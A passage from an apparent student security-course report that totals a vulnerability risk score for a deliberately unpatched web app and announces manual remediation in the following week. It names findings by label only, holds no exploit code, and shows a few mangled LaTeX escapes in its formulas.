* $W_p$ (Privacy Penalty): **10.0** (PoC-02 Public QR Aadhaar Leak, DPDP non-compliance)
* $W_d$ (Dependency Penalty): **5.0** (body-parser DoS, follow-redirects leak)

$$	ext{AICSS}_{	ext{Version 0}} = 100 - (20.0 + 18.0 + 12.0 + 10.0 + 5.0) = \mathbf{35.0 	ext{ / } 100} \quad 	ext{(HIGH RISK)}$$

### 12.2 Handover to Week 6 Manual Remediation
* **Version 0 Code Freeze Notice**: Throughout Week 5, application source code in `backend/` and `frontend/` remained **100% frozen and unpatched**, preserving exploitability for faculty video and live demonstration evaluations.
* **Week 6 Objective**: In accordance with the eight-week course progression (*Build $ightarrow$ Understand $ightarrow$ Threat-Model $ightarrow$ Scan $ightarrow$ Break Ethically $ightarrow$ **Fix** $ightarrow$ Re-test $ightarrow$ Defend*), our team will manually implement robust architectural mitigations in Week 6 without relying on unvalidated AI generation, aiming to elevate the AICSS score above **85.0/100**.
